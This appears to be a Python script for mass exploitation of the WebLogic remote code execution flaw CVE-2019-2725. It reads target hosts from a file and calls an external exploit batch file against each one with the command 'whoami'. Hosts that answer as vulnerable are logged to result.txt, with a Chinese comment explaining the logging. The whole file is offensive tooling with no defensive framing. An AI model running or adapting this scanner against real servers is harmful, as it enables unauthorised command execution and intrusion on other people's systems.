#! /usr/bin/python3
# coding:utf-8

import requests
import sys,os

def read():
	f = open("1.txt",'r')
	sourceInLines = f.readlines()
	f.close()
	new = []
	for line in sourceInLines:
		temp1 = line.strip('\n')
		exp(temp1)

def exp(temp1):
	var = "-The vulnerability does not exist\n"
	url = 'http://'+ temp1 
	#print (url)
	r=os.popen('cve2019-2725_weblogic_rce.bat'+ " "+url+'  whoami')
	#info = r.readlines()
	text = r.read()
	if text != var:   #除了没漏洞的情况，其余结果保存为result.txt
		print(url)
		print(text)
		f = open('result.txt','a+')
		f.write(url + "     "+text+"\n")
	
if __name__ == '__main__':
	f1 = open('result.txt','w')  #更新result.txt
	f1.close()
	read()
